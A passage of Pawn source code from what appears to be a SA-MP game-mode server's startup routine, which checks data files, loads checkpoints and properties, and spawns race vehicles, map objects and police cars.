	Streamer_VisibleItems(0,300);
	Streamer_VisibleItems(6,MAX_AREAS / 3);
	Streamer_TickRate(100);
	// Files/Folders Check
	folderCheck(folder_dm);
	folderCheck(folder_clans);
	folderCheck(folder_users);
	folderCheck(folder_bans);
	folderCheck(folder_props);
	folderCheck(folder_logs);
	folderCheck(folder_ip);
	folderCheck(folder_banuid);
	folderCheck(folder_info);
	folderCheck(folder_infoco);
	folderCheck(folder_houses);
	folderCheck(folder_infol);
	folderCheck(folder_backups);
	folderCheck(folder_ipdata);
	folderCheck(folder_vstores);
	folderCheck(folder_hs);
	folderCheck(folder_orgs);
	folderCheck(folder_help);
	folderCheck(folder_news);
	folderCheck(folder_shows);
	folderCheck(folder_races);
	folderCheck(folder_tutorials);
	folderCheck(folder_hq);
	folderCheck(folder_rewards);
	dbg(11,"2.5");
	fileCheck(file_rules);
	fileCheck(file_am);
	fileCheck(file_am2);
	fileCheck(file_am3);
	fileCheck(file_bb);
	fileCheck(file_words);
	fileCheck(file_cps);
	fileCheck(file_nbans);
	fileCheck(file_clans);
	if(!fkeyexist(file_clans,"Count")) fsetint(file_clans,"Count",0);
	fileCheck(file_props);
	fileCheck(file_admins);
	fileCheck(file_adm);
	fileCheck(file_vip);
	fileCheck(file_bugs);
	fileCheck(file_advices);
	fileCheck(file_preports);
	fileCheck(file_areports);
	fileCheck(file_creports);
	fileCheck(file_codes);
	fileCheck(file_ranks);
	fileCheck(file_srvdetails);
	fileCheck(file_pickups);
	fileCheck(file_hskills);
	fileCheck(file_hsruling);
	fileCheck(file_sam);
	fileCheck(file_trivia);
	fileCheck(file_botmsg);
	fileCheck(file_ftt);
	fileCheck(file_racerecords);
	fileCheck(file_orgs);
	fileCheck(file_places);
	if(!fkeyexist(file_orgs,"Count")) fsetint(file_orgs,"Count",0);
	fileCheck(file_news);
	fileCheck(file_bot);
	fileCheck(file_purim);
	fileCheck(file_music);
	fileCheck(file_statistics);
	fileCheck(file_besttoday);
	fileCheck(file_wmsg);
	fileCheck(file_trating);
	fileCheck(file_houses);
	dbg(11,"3");
	// PPT Reset
	for(new i = 0; i < MAX_PPT; i++) pptinfo[i][pptValid] = 0, pptinfo[i][pptType] = ppt_none;
	// Checkpoints, Pickups and Settings
	for(new i = 0; i < MAX_PICKUPS_; i++) pickupinfo[i][pfunc] = 0, pickupinfo[i][pvalid] = 0;
	new string[M_S], File:f, read[256], str[256], locs[256], idx, thecp = cp_none, Float:p[6], ce[2], propname[256];
	getdate(time[0],time[0],time[1]);
	todayDay = time[1];
	todayBest = fgetint(file_srvdetails,"BestToday");
	abankMoney = fgetint(file_srvdetails,"AdminBank");
	serverDetails[sdGPlayers] = fgetint(file_srvdetails,"GreatestPlayersNumber");
	serverDetails[sdGAdmins] = fgetint(file_srvdetails,"GreatestAdminsNumber");
	for(new i = 0; i < 40; i++)
	{
		format(string,sizeof(string),"WeaponKills%02d",i);
		serverDetails[sdWeaponKills][i] = fgetint(file_srvdetails,string);
	}
	for(new i = 0; i < 5; i++)
	{
		format(string,sizeof(string),"sdDeaths%02d",i);
		serverDetails[sdDeaths][i] = fgetint(file_srvdetails,string);
	}
	nextActivity = fgetint(file_srvdetails,"NextActivity");
	f = fopen(file_cps,io_read);
	dbg(11,"3.0");
	while(fread(f,read))
	{
		if(read[0] == ';' || strlen(read) < 2) continue;
		str = strtok(read,idx,'(');
		if(strlen(str) < 5) continue;
		if(equal(str,"CreateBank")) thecp = cp_bank;
		else if(equal(str,"CreateAmmunation")) thecp = cp_ammu;
		else if(equal(str,"CreateSAmmunation")) thecp = cp_sammu;
		else if(equal(str,"CreateWang")) thecp = cp_wang;
		else if(equal(str,"CreateVGarage")) thecp = cp_vgarage;
		else if(equal(str,"CreateBar")) thecp = cp_bar;
		else if(equal(str,"CreatePhone")) thecp = cp_phone;
		else if(equal(str,"CreateATM")) thecp = cp_atm;
		else if(equal(str,"CreateSGarage")) thecp = cp_sgarage;
		else if(equal(str,"CreateLighthouse")) thecp = cp_lighthouse;
		else if(equal(str,"CreateAdminBank")) thecp = cp_abank;
		else if(equal(str,"CreateGamblingPoint")) thecp = cp_gambling;
		else if(equal(str,"CreateStore")) thecp = cp_store;
		else if(equal(str,"CreateInformer")) thecp = cp_info;
		else if(equal(str,"CreateVStation")) thecp = cp_vstation;
		else if(equal(str,"CreateDancingPoint")) thecp = cp_dancing;
		else if(equal(str,"CreateJumpingPoint")) thecp = cp_jumping;
		else if(equal(str,"CreateCastle")) thecp = cp_castle;
		else if(equal(str,"CreateFurniture")) thecp = cp_furnitures;
		str = strtok(read,idx,'('), idx = 0, locs = strtok(str,idx,')'), idx = 0;
		if(thecp == cp_phone || thecp == cp_atm)
		{
			for(new i = 0; i < 6; i++) p[i] = floatstr(strtok(locs,idx,','));
			for(new i = 0; i < 2; i++) ce[i] = strval(strtok(locs,idx,','));
			CreateCheckpoint(p[0],p[1],p[2],ce[0],ce[1],thecp,p[3],p[4],p[5]);
		}
		else if(thecp == cp_store)
		{
			for(new i = 0; i < 5; i++) p[i] = floatstr(strtok(locs,idx,','));
			for(new i = 0; i < 2; i++) ce[i] = strval(strtok(locs,idx,','));
			thecp = strval(strtok(locs,idx,','));
			strmid(string,read,strfind(read,"\"",true) + 1,strfind(read,"\"",true,strfind(read,"\"",true) + 1));
			CreateCheckpoint(p[0],p[1],p[2],ce[0],ce[1],cp_store,p[3],p[4],0.0,thecp,string);
		}
		else if(thecp == cp_gambling)
		{
			for(new i = 0; i < 5; i++) p[i] = floatstr(strtok(locs,idx,','));
			for(new i = 0; i < 2; i++) ce[i] = strval(strtok(locs,idx,','));
			thecp = strval(strtok(locs,idx,','));
			CreateCheckpoint(p[0],p[1],p[2],ce[0],ce[1],cp_gambling,p[3],p[4],0.0,thecp);
		}
		else
		{
			for(new i = 0; i < 5; i++) p[i] = floatstr(strtok(locs,idx,','));
			for(new i = 0; i < 2; i++) ce[i] = strval(strtok(locs,idx,','));
			CreateCheckpoint(p[0],p[1],p[2],ce[0],ce[1],thecp,p[3],p[4]);
			if(thecp == cp_bank)
			{
				AddPerPlayer3DTextLabel(ppt_bank,p[0],p[1],p[2],25.0,ce[1]);
				CreatePickupEx(1274,1,p[0],p[1],p[2],.world=ce[1]);
			}
		}
		idx = 0;
	}
	fclose(f);
	dbg(11,"3a");
	// Properties
	idx = 0;
	f = fopen(file_props,io_read);
	while(fread(f,read))
	{
		if(read[0] == ';' || strlen(read) < 2) continue;
		str = strtok(read,idx,'(');
		str = strtok(read,idx,'('), idx = 0, locs = strtok(str,idx,')'), idx = 0;
		for(new i = 0; i < 3; i++) p[i] = floatstr(strtok(locs,idx,','));
		for(new i = 0; i < 2; i++) ce[i] = strval(strtok(locs,idx,','));
		strmid(propname,read,strfind(read,"\"",true) + 1,strfind(read,"\"",true,strfind(read,"\"",true) + 1));
		CreateProperty(p[0],p[1],p[2],ce[0],ce[1],propname,0,"",1);
		idx = 0;
	}
	fclose(f);
	dbg(11,"3b");
	// Special Properties
	//CreateProperty(-35.6984,-49.8924,1003.5469,75000,0,"Bank",1," Ёыё цф щсщр ьыэ 20 %% юыь ыёє ∙ЁыЁё ьыёЇ· ссЁў",1);
	CreateProperty(288.0334,-58.6755,1001.5156,150000,0,"Ammunation",2," Ёыё цф щсщр ьыэ 8 %% юыь ыёє ∙∙хю∙ ьўЁщщ· Ё∙ў",1);
	//CreateProperty(-1978.5582,308.2896,35.1719,120000,0,"Vehicles Store",3," Ёыё цф щсщр ьыэ 25 %% юыь °ыс ыёє ∙∙хю∙ ьўЁщщ· °ыс",1);
	CreateProperty(508.7611,-88.0471,998.9683,50000,0,"Bar",4," Ёыё цф щсщр ьыэ р· фыёє ∙ю∙хю∙ ьўЁщщ· юхЎ°щэ сс°",1);
	dbg(11,"3c");
	// Houses
	/*f = fopen(file_houses,io_read);
	while(fread(f,read))
	{
	    if(read[0] == ';' || strlen(read) < 2) continue;
	    str = strtok(read,idx,'('), str = strtok(read,idx,'('), idx = 0, locs = strtok(str,idx,')'), idx = 0;
	    for(new _i = 0; _i < 3; _i++) p[_i] = floatstr(strtok(locs,idx,','));
	    ce[0] = strval(strtok(locs,idx,','));
	    CreateHouse(p[0],p[1],p[2],ce[0],true);
	    idx = 0;
	}
	fclose(f);*/
	dbg(11,"4");
	// Classes
	for(new i=0;i<312;i++) if(IsValidSkin(i)) AddPlayerClass(i,0.0,0.0,1000.0,0.0,-1,-1,-1,-1,-1,-1);
	randclass = AddPlayerClass(0,0.0,0.0,1000.0,0.0,24,0,-1,-1,-1,-1);
	// Money Areas
	for(new i = 0; i < sizeof(MoneyAreas); i++)
	{
		MoneyAreas[i][maGangZoneID] = GangZoneCreate(MoneyAreas[i][maCoords][0],MoneyAreas[i][maCoords][1],MoneyAreas[i][maCoords][2],MoneyAreas[i][maCoords][3]);
		MoneyAreas[i][maAreaID] = CreateArea(MoneyAreas[i][maCoords][0],MoneyAreas[i][maCoords][1],MoneyAreas[i][maCoords][2],MoneyAreas[i][maCoords][3],area_money,i,0,world_normal,MoneyAreas[i][maCoords][4],MoneyAreas[i][maCoords][5]);
	}
	dbg(11,"5");
	// Server Message
	UpdateServerMessage();
	// Vehicle Stores
	new vstoreID = -1, vsKey[2][16], keyID = 0;
	for(new i = 0; i < MAX_VSTORES; i++)
	{
		format(string,sizeof(string),folder_vstores "%d.ini",i+1);
		if(fexist(string))
		{
			vstoreID = CreateVStore(fgetfloat(string,"X"),fgetfloat(string,"Y"),fgetfloat(string,"Z"),fgetint(string,"Interior"),fgetint(string,"World"),fgetfloat(string,"Size"),default_cpdistance,fgetstring(string,"Name"),fgetfloat(string,"CenterX"),fgetfloat(string,"CenterY"),fgetfloat(string,"CenterZ"),fgetfloat(string,"CenterA"),fgetint(string,"Type"));
			format(vsKey[0],sizeof vsKey[],"Vehicle%d",keyID);
			while(fkeyexist(string,vsKey[0]))
			{
				format(vsKey[1],sizeof vsKey[],"Vehicle%dCost",keyID);
				AddVStoreVehicle(vstoreID,fgetint(string,vsKey[0]),fgetint(string,vsKey[1]));
				format(vsKey[0],sizeof vsKey[],"Vehicle%d",++keyID);
			}
		}
		keyID = 0;
	}
	// Ultimate Powers
	for(new i = 0; i < sizeof(UltimatePowers); i++) upower_MaxLevel[i] = GetUltimatePowerMaxLevel_Init(i);
	for(new i = 0; i < sizeof(UltimatePowers); i++) for(new j = 0; j < upower_MaxLevel[i]; j++)
	{
		format(upower_Title[i][j],20,GetUPLTitle_Init(i,j+1));
		upower_NeededLevel[i][j] = GetUPLNeededLevel_Init(i,j+1);
		upower_Cost[i][j] = GetUPLEnCost_Init(i,j+1);
		upower_TakingEnPS[i][j] = IsUPLTakingEnPerSecond_Init(i,j+1);
	}
	dbg(11,"6");
	#if hanukkah_now
	cand_check();
	hanpickup = CreatePickup(2222, 1, -1975.0164, -2937.5032, 8.2594);
	#endif
	// Gamemode Vehicles
	CreateVehicleEx(451,2043.5582,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2047.7581,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2051.9582,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2056.1582,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2060.3581,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2064.5581,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2068.7580,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(451,2072.9580,819.3209,7.6520,360.0000,-1,-1,respawntime,0,0); // [Turismo] Race
	CreateVehicleEx(411,2039.9825,875.2350,6.7263,320.8504,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2040.0012,881.3505,6.8708,318.9966,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2039.9055,887.0860,7.0648,321.2862,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2039.9695,893.2288,7.2997,320.6432,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2040.0422,899.1013,7.5259,320.0673,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2040.0256,905.1851,7.7962,319.4208,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(411,2040.0320,911.1208,8.1185,320.3847,-1,-1,respawntime,0,0); // [Infernus] Race
	CreateVehicleEx(541,2082.3601,872.5388,7.0167,90.0000,-1,-1,respawntime,0,0); // [Bullet] Race
	CreateVehicleEx(541,2082.3601,875.7388,7.0167,90.0000,-1,-1,respawntime,0,0); // [Bullet] Race
	CreateVehicleEx(541,2082.3601,878.9388,7.0167,90.0000,-1,-1,respawntime,0,0); // [Bullet] Race
	CreateVehicleEx(541,2082.3601,882.1388,7.0167,90.0000,-1,-1,respawntime,0,0); // [Bullet] Race
	CreateVehicleEx(429,2082.3630,887.0240,7.3597,90.0000,-1,-1,respawntime,0,0); // [Banshee] Race
	CreateVehicleEx(429,2082.3630,890.2240,7.3597,90.0000,-1,-1,respawntime,0,0); // [Banshee] Race
	CreateVehicleEx(429,2082.3630,893.4240,7.3597,90.0000,-1,-1,respawntime,0,0); // [Banshee] Race
	CreateVehicleEx(429,2082.3630,896.6240,7.3597,90.0000,-1,-1,respawntime,0,0); // [Banshee] Race
 	// Race 2
	CreateVehicleEx(411,-2567.1890,1135.7206,55.4953,160.8862,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,-2562.6738,1132.5713,55.4530,161.2057,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,-2558.2813,1131.4983,55.4535,168.8604,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,-2553.6331,1130.9043,55.4431,170.3554,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,-2547.2341,1129.1077,55.4532,170.9043,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,-2540.6191,1128.1138,55.4542,177.6468,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2562.6497,1114.0833,55.3776,112.3945,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2560.3853,1112.8744,55.3615,126.1592,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2575.5376,1098.1392,55.1631,336.0831,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2596.8423,1109.0703,55.1526,340.1863,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2593.6616,1127.7860,55.1970,203.9042,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2590.0186,1124.7935,55.2535,205.8446,-1,-1,respawntime,0,0);
	CreateVehicleEx(451,-2608.2917,1115.7892,55.2836,332.6549,-1,-1,respawntime,0,0);
	CreateVehicleEx(451,-2611.3459,1117.4990,55.2847,333.2076,-1,-1,respawntime,0,0);
	CreateVehicleEx(451,-2621.1055,1162.5022,55.2854,49.8131,-1,-1,respawntime,0,0);
	CreateVehicleEx(451,-2634.6782,1135.6205,55.2832,51.4346,-1,-1,respawntime,0,0);
	CreateVehicleEx(487,-2563.0598,1152.1682,65.4110,162.4567,-1,-1,respawntime,0,0);
	CreateVehicleEx(487,-2532.8071,1145.9885,65.2620,173.9967,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2562.9165,1093.4996,55.2459,343.6622,-1,-1,respawntime,0,0);
	// DJ
	CreateVehicleEx(495,-266.9124,1542.9744,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-271.3716,1547.6622,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-275.9555,1551.3799,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-280.1994,1555.4990,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-284.5181,1559.6644,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-288.8513,1563.8430,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-293.0528,1567.8125,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-297.2592,1572.3687,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-301.7243,1576.7321,75.6492,136.1651,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,-305.6933,1580.4624,75.6492,136.1651,-1,-1,respawntime,0,0);
	// AP2
	CreateSObject(19536, -1330.02, -274.66, 13.32,   0.00, 0.00, 25.01);
	CreateSObject(19536, -1388.52, -215.31, 13.22,   0.00, 0.00, 59.94);
	CreateSObject(19536, -1353.70, -236.02, 13.18,   0.00, 0.00, 40.20);
	CreateSObject(18844, -1314.51, -147.32, -30.57,   -58.00, 0.00, 0.00);
	CreateSObject(18844, -1265.89, -199.00, -30.57,   -58.00, 0.00, 0.00);
	CreateSObject(19538, -1333.23, -129.97, 13.22,   0.00, 0.00, 315.11);
	CreateSObject(19538, -1244.83, -218.10, 13.22,   0.00, 0.00, 315.11);
	CreateSObject(18750, -1189.47, -85.93, 46.58,   90.00, 2.00, 313.25);
	CreateSObject(8210, -1200.04, -90.71, 22.08,   -88.00, 0.00, 317.17);
	CreateSObject(8210, -1206.53, -94.23, 22.03,   -88.00, 4.00, 321.25);
	CreateSObject(19884, -1300.72, -44.93, 15.89,   16.00, 0.00, 314.94);
	CreateSObject(19884, -1260.83, -5.12, 31.59,   16.00, 0.00, 315.01);
	CreateSObject(19888, -1228.02, 32.81, 45.27,   0.00, 0.00, 359.79);
	CreateSObject(19888, -1223.40, 90.75, 45.26,   0.00, 0.00, 44.68);
	CreateSObject(19889, -1267.31, 135.61, 45.30,   0.00, 0.00, 269.79);
	CreateSObject(19888, -1319.59, 139.49, 45.32,   0.00, 0.00, 135.47);
	CreateSObject(19888, -1363.20, 101.02, 45.38,   0.00, 0.00, 180.60);
	CreateSObject(19888, -1367.55, 42.94, 45.30,   0.00, 0.00, 224.36);
	CreateSObject(3437, -1365.51, -275.97, 29.46,   -3.00, -31.00, 310.00);
	CreateSObject(3437, -1369.11, -271.45, 29.32,   -3.00, 27.00, 310.33);
	CreateSObject(3437, -1388.66, -253.03, 28.58,   -6.00, -90.00, 318.74);
	CreateSObject(3437, -1384.76, -256.24, 29.97,   5.00, 0.00, 318.00);
	CreateSObject(3437, -1388.95, -252.78, 31.48,   1.00, 58.00, 318.00);
	CreateSObject(3437, -1367.11, -273.93, 28.63,   -4.00, 91.00, 308.55);
	CreateSObject(13649, -1364.99, -278.62, 25.02,   0.00, 0.00, 0.00);
	CreateSObject(13649, -1385.70, -257.10, 24.92,   0.00, 0.00, 0.00);
	CreateSObject(1683, -1308.20, -146.21, 24.00,   0.00, 0.00, 229.03);
	CreateSObject(1683, -1263.83, -194.87, 24.00,   0.00, 0.00, 225.63);
	CreateSObject(13749, -1348.01, -288.63, 17.76,   0.00, 0.00, 89.56);
	CreateSObject(13749, -1395.04, -238.48, 17.78,   0.00, 0.00, 112.17);
	CreateSObject(4824, -1112.19, -271.12, 8.11,   0.00, 0.00, 15.16);
	CreateSObject(4824, -1086.77, -263.95, -0.58,   0.00, 0.00, 15.84);
	CreateSObject(7073, -1372.54, -401.96, 28.39,   0.00, 0.00, 349.86);
	CreateSObject(1394, -1376.72, -155.75, 58.67,   0.00, 0.00, 215.82);
	CreateSObject(5126, -1264.94, -273.02, 39.25,   0.00, 0.00, 113.17);
	CreateSObject(1391, -1376.69, -155.74, 46.06,   0.00, 0.00, 329.74);
	CreateSObject(1378, -1163.39, -137.93, 36.49,   0.00, 0.00, 45.70);
	CreateSObject(7392, -1271.63, -258.36, 48.59,   0.00, 0.00, 24.62);
	CreateSObject(8483, -1410.28, -240.39, 17.94,   0.00, 0.00, 49.77);
	CreateSObject(8483, -1363.14, -286.56, 17.93,   0.00, 0.00, 36.70);
	CreateSObject(4828, -1335.25, -225.12, 19.37,   0.00, 0.00, 45.02);
	CreateSObject(14553, -1375.48, -262.50, 34.34,   0.00, 0.00, 130.94);
	CreateSObject(3474, -1422.10, -180.36, 30.57,   0.00, 0.00, 71.83);
	CreateSObject(3515, -1349.70, -268.57, 14.20,   0.00, 29.00, 114.68);
	CreateSObject(3515, -1375.44, -241.87, 14.20,   0.00, 29.00, 333.09);
	CreateSObject(9833, -1363.73, -275.18, 16.16,   0.00, 0.00, 344.26);
	CreateSObject(9833, -1383.08, -255.01, 16.16,   0.00, 0.00, 348.01);
	CreateSObject(8431, -1336.42, -3.54, 36.33,   0.00, 0.00, 314.44);
	CreateSObject(8431, -1336.37, -3.55, 22.28,   0.00, 0.00, 314.44);
	CreateSObject(8431, -1336.46, -3.47, 7.80,   0.00, 0.00, 314.44);
	CreateSObject(18836, -1195.62, -90.96, 12.61,   0.00, 0.00, 315.07);
	CreateSObject(7073, -1374.07, -157.21, 35.93,   0.00, 0.00, 323.38);
	CreateSObject(18779, -1244.26, -340.94, 14.44,   0.00, 0.00, 288.38);
	CreateSObject(18779, -1452.87, -119.33, 14.39,   0.00, 0.00, 165.34);
	CreateSObject(19536, -1442.65, -184.08, 13.22,   0.00, 0.00, 59.94);
	CreateSObject(19536, -1303.89, -331.39, 13.32,   0.00, 0.00, 25.01);
	CreateSObject(8263, -1379.82, -654.23, 22.23,   271.00, -178.00, 2.92);
	CreateSObject(8263, -1340.83, -653.57, 22.23,   271.00, -178.00, 2.92);
	CreateSObject(14553, -1577.72, -287.50, 20.08,   -31.00, -2.00, 33.49);
	CreateSObject(13649, -1371.69, -271.08, 25.02,   0.00, 0.00, 0.00);
	CreateSObject(5822, -1248.03, -67.90, 17.71,   0.00, 0.00, 49.28);
	CreateSObject(13749, -1259.40, -629.08, 19.58,   0.00, 0.00, 144.68);
	CreateSObject(19699, -1334.93, -623.96, 20.42,   -3.00, 33.00, 92.00);
	CreateSObject(9766, -1396.12, -604.09, 5.20,   -39.00, 0.00, 359.28);
	CreateSObject(3528, -1372.68, -265.35, 19.06,   0.00, 0.00, 38.39);
	CreateSObject(1655, -1729.16, -353.11, 14.49,   0.00, 0.00, 87.75);
	CreateSObject(4832, -1630.25, -350.00, 53.28,   0.00, 0.00, 60.58);
	CreateSObject(693, -1472.76, -69.42, 13.00,   0.00, 0.00, 0.00);
	CreateSObject(693, -1458.52, -55.17, 13.00,   0.00, 0.00, 0.00);
	CreateSObject(690, -1408.37, 31.00, 12.56,   0.00, 0.00, 26.51);
	CreateSObject(698, -1591.98, -189.45, 19.26,   0.00, 0.00, 311.06);
	CreateSObject(698, -1574.42, -171.98, 19.26,   0.00, 0.00, 314.41);
	CreateSObject(698, -1557.06, -154.84, 19.26,   0.00, 0.00, 314.41);
	CreateSObject(693, -1445.36, -42.57, 13.00,   0.00, 0.00, 0.00);
	CreateSObject(705, -1191.67, 176.59, 13.54,   0.00, 0.00, 322.30);
	CreateSObject(705, -1208.02, 159.57, 13.54,   0.00, 0.00, 322.30);
	CreateSObject(705, -1222.93, 144.66, 13.54,   0.00, 0.00, 322.30);
	CreateSObject(695, -1233.04, 221.05, 13.00,   0.00, 0.00, 0.00);
	CreateSObject(694, -1091.92, -210.88, 14.99,   0.00, 0.00, 14.18);
	CreateSObject(694, -1108.29, -184.81, 14.99,   0.00, 0.00, 21.64);
	CreateSObject(7981, -1479.25, -250.45, 29.32,   0.00, 0.00, 264.21);
	CreateSObject(7981, -1474.27, -226.30, 29.32,   0.00, 0.00, 85.94);
	CreateSObject(7981, -1341.22, -362.58, 29.43,   0.00, 0.00, 7.77);
	CreateSObject(7981, -1365.85, -362.99, 29.43,   0.00, 0.00, 187.61);
	CreateSObject(617, -1348.16, -378.07, 13.18,   0.00, 0.00, 0.00);
	CreateSObject(617, -1338.70, -376.42, 13.18,   0.00, 0.00, 0.00);
	CreateSObject(617, -1329.50, -374.63, 13.18,   0.00, 0.00, 0.00);
	CreateSObject(655, -1494.43, -225.14, 13.27,   0.00, 0.00, 0.00);
	CreateSObject(655, -1492.51, -218.39, 13.27,   0.00, 0.00, 0.00);
	CreateSObject(655, -1491.28, -210.92, 13.27,   0.00, 0.00, 0.00);
	CreateSObject(16133, -1118.41, -298.55, -14.86,   0.00, 0.00, 330.60);
	CreateSObject(16133, -1115.08, -297.54, -15.99,   0.00, 0.00, 321.66);
	CreateSObject(16133, -1124.03, -293.73, -15.97,   0.00, 0.00, 256.87);
	CreateSObject(16133, -1116.26, -295.75, -17.54,   0.00, 0.00, 256.87);
	CreateSObject(3472, -1362.38, -280.91, 23.94,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1396.02, -248.52, 23.94,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1336.76, -52.47, 13.40,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1307.95, -80.66, 13.40,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1200.38, 1.77, 13.00,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1362.53, -1.76, 45.83,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1337.41, 23.13, 45.83,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1272.15, -685.32, 26.00,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1334.36, -685.30, 26.10,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1396.78, -685.33, 26.21,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1459.90, -685.27, 26.30,   0.00, 0.00, 0.00);
	CreateSObject(3472, -1347.88, -268.53, 13.68,   0.00, 0.00, 342.77);
	CreateSObject(3472, -1375.24, -240.02, 13.68,   0.00, 0.00, 342.77);
	CreateSObject(3472, -1354.34, -356.30, 25.03,   0.00, 0.00, 35.18);
	CreateSObject(3472, -1470.62, -238.99, 24.67,   0.00, 0.00, 290.04);
	CreateSObject(19128, -1311.83, -6.19, 43.77,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1314.50, -8.72, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1317.23, -11.51, 43.77,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1320.11, -14.37, 43.87,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1322.88, -17.06, 44.57,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1325.77, -19.86, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1328.60, -22.59, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1331.36, -25.49, 43.75,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1334.22, -28.18, 43.74,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1336.84, -25.50, 43.73,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1334.08, -22.76, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1331.31, -19.98, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1328.67, -17.32, 43.85,   0.00, 0.00, 315.12);
	CreateSObject(19128, -1325.67, -14.53, 43.73,   0.00, 0.00, 224.50);
	CreateSObject(19128, -1322.79, -11.70, 43.77,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1319.94, -8.93, 43.77,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1317.10, -6.17, 43.76,   0.00, 0.00, 314.61);
	CreateSObject(19128, -1314.47, -3.48, 43.77,   0.00, 0.00, 314.61);
	CreateSObject(18761, -1321.72, -17.49, 47.32,   0.00, 0.00, 44.21);
	CreateSObject(1655, -1323.53, -15.48, 44.86,   0.00, 0.00, 225.06);
	// AP2 ENDS
	CreateVehicleEx(598,2303.4958,2430.3103,3.0190,0.6142,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD0
	CreateVehicleEx(598,2314.1369,2465.0097,3.0176,90.2535,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD0
	CreateVehicleEx(598,2281.2045,2475.0876,3.0224,1.5988,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD0
	CreateVehicleEx(598,2277.1958,2430.5837,2.9621,0.1113,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD0
	CreateVehicleEx(599,2239.9978,2442.3652,3.4632,270.9119,-1,-1,respawntime,0,0); // [Police Ranger] LVPD0
	CreateVehicleEx(599,2307.9572,2430.5136,3.4740,2.5002,-1,-1,respawntime,0,0); // [Police Ranger] LVPD0
	CreateVehicleEx(599,2298.0043,2460.3295,3.4692,270.4278,-1,-1,respawntime,0,0); // [Police Ranger] LVPD0
	CreateVehicleEx(599,2263.9440,2474.0717,3.4605,359.9720,-1,-1,respawntime,0,0); // [Police Ranger] LVPD0
	CreateVehicleEx(598,2277.9633,2442.7353,10.5660,359.8112,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD1
	CreateVehicleEx(598,2251.7360,2442.3320,10.5662,0.2220,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD1
	CreateVehicleEx(598,2255.9438,2460.0788,10.5691,359.1912,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD1
	CreateVehicleEx(598,2269.0981,2476.7145,10.5691,179.1712,-1,-1,respawntime,0,0); // [Police Car (LVPD)] LVPD1
	CreateVehicleEx(599,2291.0451,2443.4594,11.0196,358.7061,-1,-1,respawntime,0,0); // [Police Ranger] LVPD1
	CreateVehicleEx(599,2260.4323,2477.4682,11.0063,179.6341,-1,-1,respawntime,0,0); // [Police Ranger] LVPD1
	CreateVehicleEx(523,2261.8588,2443.3688,10.3836,359.1337,-1,-1,respawntime,0,0); // [HPV1000] LVPD1
	CreateVehicleEx(523,2273.3237,2458.8896,10.3909,358.0080,-1,-1,respawntime,0,0); // [HPV1000] LVPD1
